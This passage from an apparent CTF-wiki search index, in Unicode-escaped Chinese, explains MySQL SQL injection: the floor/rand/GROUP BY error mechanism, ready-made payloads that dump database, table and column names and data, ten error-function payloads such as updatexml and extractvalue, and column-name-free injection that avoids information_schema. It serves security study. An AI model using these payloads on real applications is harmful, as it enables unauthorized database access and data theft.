<p>\u5728\u8fd9\u5f20\u865a\u62df\u8868\u4e2d\uff0cgroupby\u540e\u9762\u7684\u5b57\u6bb5\u4f5c\u4e3a\u4e3b\u952e\uff0c\u6240\u4ee5\u8fd9\u5f20\u8868\u4e2d\u4e3b\u952e\u662fname\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u57fa\u672c\u5f04\u6e05\u62a5\u9519\u7684\u539f\u56e0\u4e86\uff0c\u5176\u539f\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u865a\u62df\u8868\u7684\u4e3b\u952e\u91cd\u590d\u3002\u6309\u7167MySQL\u7684\u5b98\u65b9\u8bf4\u6cd5\uff0cgroup by\u8981\u8fdb\u884c\u4e24\u6b21\u8fd0\u7b97\uff0c\u7b2c\u4e00\u6b21\u662f\u62ffgroup by\u540e\u9762\u7684\u5b57\u6bb5\u503c\u5230\u865a\u62df\u8868\u4e2d\u53bb\u5bf9\u6bd4\u524d\uff0c\u9996\u5148\u83b7\u53d6group by\u540e\u9762\u7684\u503c\uff1b\u7b2c\u4e8c\u6b21\u662f\u5047\u8bbegroup by\u540e\u9762\u7684\u5b57\u6bb5\u7684\u503c\u5728\u865a\u62df\u8868\u4e2d\u4e0d\u5b58\u5728\uff0c\u90a3\u5c31\u9700\u8981\u628a\u5b83\u63d2\u5165\u5230\u865a\u62df\u8868\u4e2d\uff0c\u8fd9\u91cc\u5728\u63d2\u5165\u65f6\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8fd0\u7b97\uff0c\u7531\u4e8erand\u51fd\u6570\u5b58\u5728\u4e00\u5b9a\u7684\u968f\u673a\u6027\uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u4e0e\u7b2c\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u4e0d\u4e00\u81f4\uff0c\u4f46\u662f\u8fd9\u4e2a\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u5728\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u90a3\u4e48\u8fd9\u65f6\u7684\u63d2\u5165\u5fc5\u7136\u5bfc\u81f4\u4e3b\u952e\u7684\u91cd\u590d\uff0c\u8fdb\u800c\u5f15\u53d1\u9519\u8bef\u3002</p> <p>\u7528\u5230\u7684\u51fd\u6570floor()</p> <pre><code>group by\u662f\u6839\u636e\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5206\u7ec4\u7684sql\u8bed\u53e5\uff0c\u5176\u7528\u6cd5\u4e3a\uff1a\nSELECTcolumn_name, aggregate_function(column_name)\nFROM table_name\nWHERE column_nameoperator value\nGROUP BYcolumn_name\n\npayload:'unionselect 1 from (select count(*),concat((slelect\u8bed\u53e5),floor(rand(0)*2))x from \"\u4e00\u4e2a\u8db3\u5927\u7684\u8868\" group by x)a--+\n\u7206\u6570\u636e\u5e93\u540d\uff1a'union select 1 from (select count(*),concat((select database()),\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u8868\u540d\uff1a'union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u5217\u540d\uff1a'union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=\"TABLE_NAME\" limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u6570\u636e\uff1a'union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n</code></pre>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_3","title":"\u5177\u4f53\u539f\u7406\u793a\u4f8b","text":"<p>copy\u3001\u540e\u6765\u672c\u5730\u505a\u8fc7\u51e0\u6b21\u6d4b\u8bd5</p> <p>\u6211\u4eec\u9700\u8981\u77e5\u9053group by\u7684\u751f\u6210\u865a\u62df\u8868\u7684\u673a\u5236</p> <p></p> <p></p> <p>\u6700\u5f00\u59cb\u6211\u4eec\u770b\u5230\u7684\u8fd9\u5f20sage-count()\u8868\u5e94\u8be5\u65f6\u7a7a\u7684\uff0c\u4f46\u662f\u5728group by\u8bed\u53e5\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u884c\u4e00\u884c\u7684\u53bb\u626b\u63cf\u539f\u59cb\u8868\u7684sage\u5b57\u6bb5\uff0c\u5982\u679csage\u5728sage-count()\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u5c31\u5c06\u4ed6\u63d2\u5165\uff0c\u5e76\u7f6ecount()\u7f6e1\uff0c\u5982\u679csage\u5728sage-count()\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\uff0c\u90a3\u4e48\u5c31\u5728\u539f\u6765\u7684count(*)\u57fa\u7840\u4e0a\u52a01\uff0c\u5c31\u8fd9\u6837\u76f4\u5230\u626b\u63cf\u5b8c\u6574\u4e2a\u8868\uff0c\u5c31\u5f97\u5230\u6211\u4eec\u770b\u5230\u7684\u8fd9\u4e2a\u8868\u4e86\u3002</p> <p>\u6ce8\uff1a\u8fd9\u91cc\u6709\u7279\u522b\u91cd\u8981\u7684\u4e00\u70b9\uff0cgroup by\u540e\u9762\u7684\u5b57\u6bb5\u662f\u865a\u62df\u8868\u7684\u4e3b\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u662f\u4e0d\u80fd\u91cd\u590d\u7684\uff0c\u8fd9\u662f\u540e\u9762\u62a5\u9519\u6210\u529f\u7684\u5173\u952e\u70b9</p> <p></p> <p>rand(0)\u751f\u6210\u7684\u6570\u636e\u6709\u89c4\u5f8b\u53ef\u5faa</p> <p>0110 0110</p> <p>\u7b2c\u4e00\u6b21\uff1a\u6211\u4eec\u4e4b\u524d\u4e0d\u662f\u8bf4\u4e86\u4f1a\u628agroup by\u540e\u9762\u7684\u5b57\u6bb5\u503c\u62ff\u5230\u865a\u62df\u8868\u4e2d\u53bb\u5bf9\u6bd4\u5417\uff0c\u5728\u5bf9\u6bd4\u4e4b\u524d\u80af\u5b9a\u8981\u77e5\u9053group by\u540e\u9762\u5b57\u6bb5\u7684\u503c\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b21\u7684\u8fd0\u7b97\u5c31\u53d1\u751f\u5728\u8fd9\u91cc\u3002</p> <p>\u7b2c\u4e8c\u6b21\uff1a\u73b0\u5728\u5047\u8bbe\u6211\u4eec\u4e0b\u4e00\u6b21\u626b\u63cf\u7684\u5b57\u6bb5\u7684\u503c\u6ca1\u6709\u5728\u865a\u62df\u8868\u4e2d\u51fa\u73b0\uff0c\u4e5f\u5c31\u662fgroup by\u540e\u9762\u7684\u5b57\u6bb5\u7684\u503c\u5728\u865a\u62df\u8868\u4e2d\u8fd8\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u628a\u5b83\u63d2\u5165\u5230\u865a\u62df\u8868\u4e2d\uff0c\u8fd9\u91cc\u5728\u63d2\u5165\u65f6\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8fd0\u7b97\uff0c\u7531\u4e8erand\u51fd\u6570\u5b58\u5728\u4e00\u5b9a\u7684\u968f\u673a\u6027\uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u4e0e\u7b2c\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u4e0d\u4e00\u81f4\uff0c\u4f46\u662f\u8fd9\u4e2a\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u5728\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u90a3\u4e48\u8fd9\u65f6\u7684\u63d2\u5165\u5fc5\u7136\u5bfc\u81f4\u9519\u8bef\uff01</p> <p>\u7136\u540e\u8d70\u4e00\u904d\u6d41\u7a0b</p> <pre><code>select count(*),(concat(floor(rand(0)*2),'@',(select version())))x from users group by x\n</code></pre> <p></p> <p>\u6211\u4eec\u8ddf\u7740\u521a\u521a\u7684\u601d\u8def\u8d70\uff0c\u6700\u5f00\u59cb\u7684\u865a\u62df\u8868\u662f\u7a7a\u7684\uff0c\u5c31\u50cf\u4e0b\u9762\u4e00\u6837\uff1a</p> <p>\u5f53\u6211\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e00\u9879\u65f6\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97\uff0cfloor(rand(0)*2)\u662f0\uff0c\u7136\u540e\u548c\u6570\u636e\u5e93\u7684\u7248\u672c\u53f7\uff08\u5047\u8bbe\u5c31\u662f5.7.19\uff09\u62fc\u63a5\uff0c\u5230\u865a\u62df\u8868\u91cc\u53bb\u5bfb\u627ex\u6709\u6ca1\u6709x\u7684\u503c\u662fx@5.7.19\u7684\u6570\u636e\u9879\uff0c\u7ed3\u679c\u663e\u7136\u662f\u6ca1\u6709\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u5c06\u5b83\u63d2\u5165\u5230\u4e0a\u8868\u4e2d\uff0c\u4f46\u662f\u8fd8\u8bb0\u5f97\u5417\uff0c\u5728\u63d2\u5165\u4e4b\u524d\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u8fd9\u65f6x\u7684\u503c\u5c31\u53d8\u6210\u4e861@5.7.19\uff0c\u6240\u4ee5\u865a\u62df\u8868\u53d8\u6210\u4e86\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p>\u73b0\u5728\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e8c\u9879\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97x==\u20191@5.7.19\u2018\uff0c\u5df2\u7ecf\u5b58\u5728\uff0c\u4e0d\u9700\u8981\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u76f4\u63a5\u63d2\u5165\uff0c\u5f97\u5230\u4e0b\u8868\uff1a</p> <p>\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e09\u9879\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97x==\u20180@5.7.19\u2019\uff0c\u865a\u62df\u8868\u4e2d\u627e\u4e0d\u5230\uff0c\u90a3\u4e48\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u8fd9\u65f6x==\u20181@5.7.19\u2019\uff0c\u7136\u540e\u63d2\u5165\uff0c\u4f46\u662f\u63d2\u5165\u7684\u65f6\u5019\u95ee\u9898\u5c31\u53d1\u751f\u4e86\uff0c\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4ee51@5.7.19\u4e3a\u4e3b\u952e\u7684\u6570\u636e\u9879\u4e86\uff0c\u63d2\u5165\u5931\u8d25\uff0c\u7136\u540e\u5c31\u62a5\u9519\u4e86\uff01</p> <p>\u603b\u4e4b\uff0c\u62a5\u9519\u6ce8\u5165\uff0crand(0),floor(),group by\u7f3a\u4e00\u4e0d\u53ef</p> <p>\u8fd8\u662f\u633a\u5de7\u5999\u7684\u3002</p> <p>\u4f46\u662f\u7528\u8d77\u6765\u5c31\u6253payload</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_4","title":"\u66b4\u529b","text":"<p>\u66b4\u529b\u80fd\u89e3\u51b3\u5f88\u591a\u95ee\u9898\uff0c\u5e0c\u671b\u4e0b\u9762\u7684\u51fd\u6570\u80fd\u5e2e\u52a9\u5230\u5927\u5bb6</p> <pre><code>1.floor()\nselect * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n2.extractvalue()\nselect * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n3.updatexml()\nselect * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n4.geometrycollection()\nselect * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));\n5.multipoint()\nselect * from test where id=1 and multipoint((select * from(select * from(select user())a)b));\n6.polygon()\nselect * from test where id=1 and polygon((select * from(select * from(select user())a)b));\n7.multipolygon()\nselect * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));\n8.linestring()\nselect * from test where id=1 and linestring((select * from(select * from(select user())a)b));\n9.multilinestring()\nselect * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));\n10.exp()\nselect * from test where id=1 and exp(~(select * from(select user())a));\n\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u521d\u5b66\u8005\u5efa\u8bae\u5148\u770b\u4f8b\u9898-2\u770b\u770b\u4f7f\u7528\uff0c\u5176\u5b83\u77e5\u9053\u7684\u8bdd\u968f\u610f\uff0c\u5c31\u5f53\u770b\u4e2a\u70ed\u95f9\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#information_schema","title":"\u9996\u5148\u662finformation_schema","text":"<p>information_schema \u6570\u636e\u5e93\u8ddf performance_schema \u4e00\u6837\uff0c\u90fd\u662f MySQL \u81ea\u5e26\u7684\u4fe1\u606f\u6570\u636e\u5e93\u3002\u5176\u4e2d performance_schema \u7528\u4e8e\u6027\u80fd\u5206\u6790\uff0c\u800c information_schema \u7528\u4e8e\u5b58\u50a8\u6570\u636e\u5e93\u5143\u6570\u636e(\u5173\u4e8e\u6570\u636e\u7684\u6570\u636e)\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u540d\u3001\u8868\u540d\u3001\u5217\u7684\u6570\u636e\u7c7b\u578b\u3001\u8bbf\u95ee\u6743\u9650\u7b49\u3002</p> <p>information_schema \u4e2d\u7684\u8868\u5b9e\u9645\u4e0a\u662f\u89c6\u56fe\uff0c\u800c\u4e0d\u662f\u57fa\u672c\u8868\uff0c\u56e0\u6b64\uff0c\u6587\u4ef6\u7cfb\u7edf\u4e0a\u6ca1\u6709\u4e0e\u4e4b\u76f8\u5173\u7684\u6587\u4ef6\u3002</p> <pre><code>mysql&gt; use information_schema;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\nDatabase changed\nmysql&gt; show tables;\n+---------------------------------------+\n| Tables_in_information_schema          |\n+---------------------------------------+\n| CHARACTER_SETS                        |\n| COLLATIONS                            |\n| COLLATION_CHARACTER_SET_APPLICABILITY |\n| COLUMNS                               |\n| COLUMN_PRIVILEGES                     |\n| ENGINES                               |\n| EVENTS                                |\n| FILES                                 |\n| GLOBAL_STATUS                         |\n| GLOBAL_VARIABLES                      |\n| KEY_COLUMN_USAGE                      |\n| OPTIMIZER_TRACE                       |\n| PARAMETERS                            |\n| PARTITIONS                            |\n| PLUGINS                               |\n| PROCESSLIST                           |\n| PROFILING                             |\n| REFERENTIAL_CONSTRAINTS               |\n| ROUTINES                              |\n| SCHEMATA                              |\n| SCHEMA_PRIVILEGES                     |\n| SESSION_STATUS                        |\n| SESSION_VARIABLES                     |\n| STATISTICS                            |\n| TABLES                                |\n| TABLESPACES                           |\n| TABLE_CONSTRAINTS                     |\n| TABLE_PRIVILEGES                      |\n| TRIGGERS                              |\n| USER_PRIVILEGES                       |\n| VIEWS                                 |\n| INNODB_LOCKS                          |\n| INNODB_TRX                            |\n| INNODB_SYS_DATAFILES                  |\n| INNODB_FT_CONFIG                      |\n| INNODB_SYS_VIRTUAL                    |\n| INNODB_CMP                            |\n| INNODB_FT_BEING_DELETED               |\n| INNODB_CMP_RESET                      |\n| INNODB_CMP_PER_INDEX                  |\n| INNODB_CMPMEM_RESET                   |\n| INNODB_FT_DELETED                     |\n| INNODB_BUFFER_PAGE_LRU                |\n| INNODB_LOCK_WAITS                     |\n| INNODB_TEMP_TABLE_INFO                |\n| INNODB_SYS_INDEXES                    |\n| INNODB_SYS_TABLES                     |\n| INNODB_SYS_FIELDS                     |\n| INNODB_CMP_PER_INDEX_RESET            |\n| INNODB_BUFFER_PAGE                    |\n| INNODB_FT_DEFAULT_STOPWORD            |\n| INNODB_FT_INDEX_TABLE                 |\n| INNODB_FT_INDEX_CACHE                 |\n| INNODB_SYS_TABLESPACES                |\n| INNODB_METRICS                        |\n| INNODB_SYS_FOREIGN_COLS               |\n| INNODB_CMPMEM                         |\n| INNODB_BUFFER_POOL_STATS              |\n| INNODB_SYS_COLUMNS                    |\n| INNODB_SYS_FOREIGN                    |\n| INNODB_SYS_TABLESTATS                 |\n+---------------------------------------+\nPlain Text\n</code></pre> <p>MySQL \u4e2d\u7684 information_schema \u6570\u636e\u5e93_kikajack\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <ol> <li>\u6982\u8ff0information_schema \u6570\u636e\u5e93\u8ddf performance_schema \u4e00\u6837\uff0c\u90fd\u662f MySQL \u81ea\u5e26\u7684\u4fe1\u606f\u6570\u636e\u5e93\u3002\u5176\u4e2d performance_schema \u7528\u4e8e\u6027\u80fd\u5206\u6790\uff0c\u800c information_schema \u7528\u4e8e\u5b58\u50a8\u6570\u636e\u5e93\u5143\u6570\u636e(\u5173\u4e8e\u6570\u636e\u7684\u6570\u636e)\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u540d\u3001\u8868\u540d\u3001\u5217\u7684\u6570\u636e\u7c7b\u578b\u3001\u8bbf\u95ee\u6743\u9650\u7b49\u3002information_schema \u4e2d\u7684\u8868\u5b9e\u9645\u4e0a\u662f\u89c6\u56fe\uff0c\u800c\u4e0d\u662f\u57fa\u672c...</li> </ol> <p>https://blog.csdn.net/kikajack/article/details/80065753</p> <p>\u5269\u4e0b\u7684\u81ea\u5df1\u53ef\u4ee5\u53bb\u770b\u770b\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#infromation_schema","title":"\u7ed5\u8fc7infromation_schema \u65e0\u5217\u540d\u6ce8\u5165\uff1a","text":"<p>\u603b\u4e4b\uff0c\u5982\u679c\u662fmysql\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5143\u6570\u636e\u5e93\u5c31\u662f\u4f60\u8086\u65e0\u5fcc\u60ee\u7684\u4fdd\u8bc1\uff0c\u7531\u4e8e\u5b83\u5b58\u50a8\u4e86\u6570\u636e\u5e93\u5168\u90e8\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6709\u4e86\u4ed6\uff0c\u57fa\u672c\u7684\u64cd\u4f5c\u5c31\u6709\u4e86\u4fdd\u969c\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u4e0d\u662f\u968f\u65f6\u90fd\u80fd\u7528\u8fd9\u4e2a\u6570\u636e\u5e93\u7684\uff0c\u5982\u679c\u8fc7\u6ee4\u6389\u4e86information_schema,\u6211\u4eec\u8be5\u600e\u4e48\u529e\uff1f</p>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_2","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u6765\u67e5\u51fa\u8868\u540d\uff1a</p> <p>1.InnoDb\u5f15\u64ce</p> <p>\u4eceMYSQL5.5.8\u5f00\u59cb\uff0cInnoDB\u6210\u4e3a\u5176\u9ed8\u8ba4\u5b58\u50a8\u5f15\u64ce\u3002\u800c\u5728MYSQL5.6\u4ee5\u4e0a\u7684\u7248\u672c\u4e2d\uff0cinndb\u589e\u52a0\u4e86innodb_index_stats\u548cinnodb_table_stats\u4e24\u5f20\u8868\uff0c\u8fd9\u4e24\u5f20\u8868\u4e2d\u90fd\u5b58\u50a8\u4e86\u6570\u636e\u5e93\u548c\u5176\u6570\u636e\u8868\u7684\u4fe1\u606f\uff0c\u4f46\u662f\u6ca1\u6709\u5b58\u50a8\u5217\u540d\u3002</p> <p>2.sys\u6570\u636e\u5e93</p> <p>\u57285.7\u4ee5\u4e0a\u7684MYSQL\u4e2d\uff0c\u65b0\u589e\u4e86sys\u6570\u636e\u5e93\uff0c\u8be5\u5e93\u7684\u57fa\u7840\u6570\u636e\u6765\u81eainformation_schema\u548cperformance_chema\uff0c\u5176\u672c\u8eab\u4e0d\u5b58\u50a8\u6570\u636e\u3002\u53ef\u4ee5\u901a\u8fc7\u5176\u4e2d\u7684schema_auto_increment_columns\u6765\u83b7\u53d6\u8868\u540d\u3002</p> <pre><code>select table_name from mysql.innodb_index_stats \u8868\u540d\nselect database_name from mysql.innodb_index_stats \u5e93\u540d\nselect table_name from mysql.innodb_table_stats \u8868\u540d\nselect database_name from mysql.innodb_table_stats \u5e93\u540d\nPlain Text\n</code></pre> <p>\u4f46\u662f\u4e0a\u8ff0\u4e24\u79cd\u65b9\u6cd5\u90fd\u53ea\u80fd\u67e5\u51fa\u8868\u540d\uff0c\u65e0\u6cd5\u67e5\u5230\u5217\u540d\uff0c\u8fd9\u65f6\u6211\u4eec\u5c31\u8981\u7528\u5230\u65e0\u5217\u540d\u6ce8\u5165\u4e86\u3002\u65e0\u5217\u540d\u6ce8\u5165\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u4e0d\u9700\u8981\u5217\u540d\u5c31\u80fd\u6ce8\u51fa\u6570\u636e\u7684\u6ce8\u5165\u3002</p> <p>\u5728\u53d6\u522b\u540d\u7684\u540c\u65f6\u67e5\u8be2\u6570\u636e\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u73b0\u5728\u6709\u4e00\u4e2a\u53ebxxx\u7684\u8868\uff0c\u8fd9\u4e2a\u8868\u6709\u4e09\u5217\uff0c\u5217\u540d\u5206\u522b\u4e3aid,user,password\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u7528\u65e0\u5217\u540d\u67e5\u8be2\u7684\u65b9\u5f0f\u6765\u67e5\u4e00\u4e0b\u8868\u4e2d\u6570\u636e\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6b64\u65f6\u5f97\u5230\u4e86\u4e00\u4e2a\u865a\u62df\u8868\uff0c\u5217\u540d\u5206\u522b\u4e3a1\uff0c2\uff0c3\uff0c\u5176\u4e2d\u5b58\u50a8\u4e86xxx\u8868\u4e2d\u7684\u6240\u6709\u6570\u636e\u3002</p> <p>\u6ce8\uff1a\u8fdb\u884c\u67e5\u8be2\u65f6\u8bed\u53e5\u7684\u5b57\u6bb5\u6570\u5fc5\u987b\u548c\u6307\u5b9a\u8868\u4e2d\u7684\u5b57\u6bb5\u6570\u4e00\u6837\uff0c\u4e0d\u80fd\u591a\u4e5f\u4e0d\u80fd\u5c11\uff0c\u4e0d\u7136\u5c31\u4f1a\u62a5\u9519</p> <p></p> <p>\u6211\u4eec\u8fdb\u884c\u65e0\u5217\u540d\u6ce8\u5165\u5c31\u662f\u5229\u7528\u4e86\u8be5\u65b9\u6cd5\uff0c\u901a\u8fc7\u65e0\u5217\u540d\u67e5\u8be2\u6784\u9020\u4e00\u4e2a\u865a\u62df\u8868\uff0c\u5728\u6784\u9020\u6b64\u8868\u7684\u540c\u65f6\u67e5\u8be2\u5176\u4e2d\u7684\u6570\u636e\u3002</p> <p></p> <p>\u50cf\u8fd9\u6837\u5c31\u53ef\u4ee5\u67e5\u8be2\u7b2c\u4e8c\u5217\u7684\u6570\u636e\uff0c\u5728\u865a\u62df\u8868\u4e2d\uff0c\u5217\u540d\u90fd\u662f1\uff0c2\uff0c3\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u67e5\u8be2\u8bed\u53e5\u4e2d\u8981\u7528 <code>2</code> \u800c\u4e0d\u80fd\u76f4\u63a5\u7528 2 \u3002\u672b\u5c3e\u7684 n \u662f\u7528\u6765\u547d\u540d\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u5b57\u7b26\u3002\u4e0d\u8fc7\u6709\u65f6\u5019 ` \u4e5f\u4f1a\u88ab\u8fc7\u6ee4\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53c8\u8981\u7528\u5230\u53d6\u522b\u540d\u7684\u64cd\u4f5c\u4e86\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6b64\u65f6\u6784\u9020\u7684\u865a\u62df\u8868\u7684\u5217\u540d\u5c31\u5206\u522b\u662fa,b,c\u4e86\u3002\u6b64\u65f6\u67e5\u8be2\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7a\uff0cb\uff0cc\u6765\u67e5\u3002</p> <p></p> <pre><code>select 1,2,3 union select * from sc;select `1` from (select 1,2,3 union select * from sc)a;select `2` from (select 1,2,3 union select * from sc)a;\nSQL\n</code></pre>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_3","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":""},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#join","title":"join","text":"<p>\u6b64join\u975e\u5f7cjoin\uff08\u6697\u793assti\u91cc\u9762\u7684join\u8fc7\u6ee4\u5668\uff09</p> <p>\u4e00\u822c\u4e5f\u7528\u8fd9\u4e2ajoin\u6765\u7ed5\u8fc7information_schema</p> <p>\u8bb2\u5b9e\u8bdd\u5e94\u8be5\u653e\u5230\u62a5\u9519\u6ce8\u5165\u91cc\u9762\u7684\u3002</p> <p>\u5229\u7528\u539f\u7406\u662f\u5217\u540d\u91cd\u590d</p> <p>select*from(selecta.1frommysql.user ajoinmysql.user b)c</p> <p></p> <p>\u67e5\u770b\u62a5\u9519\u4fe1\u606f\u3002</p> <p>\u518d\u7ed9\u4e00\u4e2a\uff1a</p> <pre><code>select * from user where id = -1 union all select * from (select * fromuser as a join user as b)as c;\nPlain Text\n</code></pre> <p></p> <p>\u62a5\u9519\u51fa\u5217\u540d\u3002</p> <pre><code> select * from user where id = -1union all select*from (select * from user as a join user b using(id,username,passwd,phone))c;\nPlain Text\n</code></pre> <p>\u540c\u6837\u7684\u4e5f\u53ef\u4ee5\u7ee7\u7eed\u53bb\u5229\u7528\uff0c\u7136\u540e\u8bfb\u53d6\u5b57\u6bb5</p> <p></p> <p>\u4f8b\u9898</p> <p>SWPU2019 web1\u7684wp\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_4","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u653e\u51e0\u5f20\u81ea\u5df1\u5b9e\u9a8c\u7684\u7ed3\u679c\uff1a</p> <p></p> <p></p>"},{"location":"web/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/","title":"\u8054\u5408\u67e5\u8be2","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>union select \u7684\u7528\u6cd5\u548c\u6027\u8d28\u5c31\u4e0d\u5728\u6b64\u8d58\u8ff0</p> <p>\u8fd9\u91cc\u662f\u6211\u7b14\u8bb0\u4e2d\u7684\u4e00\u4e2a\u6027\u8d28\uff0c\u5f88\u9057\u61be\uff0c\u6211\u6ca1\u6709\u8bb0\u5f55\u4f8b\u9898</p>"},{"location":"web/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/#_2","title":"\u8054\u5408\u67e5\u8be2\u5e76\u4e0d\u5b58\u5728\u7684\u6570\u636e\u65f6\uff0c\u8054\u5408\u67e5\u8be2\u5c31\u4f1a\u6784\u9020\u4e00\u4e2a\u865a\u62df\u7684\u6570\u636e\u3002","text":"<p>\u6709\u4e0a\u9762\u8fd9\u6837\u4e00\u53e5\u8bdd</p> <p>\u6b63\u5e38\uff1a</p> <p></p> <p>\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u6539\u4e3a\u6570\u636e\u5e93\u4e2d\u4e0d\u5b58\u5728\u7684\u503c\uff1a</p> <p></p> <p>\u56e0\u4e3aaaa\u5e76\u4e0d\u5b58\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u8be5\u67e5\u8be2\u4ec5\u8fd4\u56de\u8fde\u4e2a\u67e5\u8be2\u7684\u7b2c\u4e8c\u4e2a\u67e5\u8be2\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u7684passwd\u5b57\u6bb5\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u800c\u7528\u6237\u8f93\u5165\u7684password\u4e5f\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u3002</p> 